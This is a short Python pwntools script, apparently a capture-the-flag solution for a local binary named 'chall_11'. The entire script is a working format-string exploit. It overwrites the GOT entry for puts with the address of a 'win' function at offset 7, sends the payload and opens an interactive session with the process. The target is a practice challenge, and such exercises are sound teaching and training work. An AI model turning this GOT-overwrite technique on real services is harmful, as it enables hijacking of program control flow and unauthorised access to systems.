# coding: utf-8
from pwn import *
def exploit():
    proc= process("./chall_11")
    elf= ELF("./chall_11")
    of= 7
    p= fmtstr_payload(of,{elf.got.puts:elf.sym.win})
    proc.sendline(p)
    proc.interactive()
    proc.close()
    
exploit()
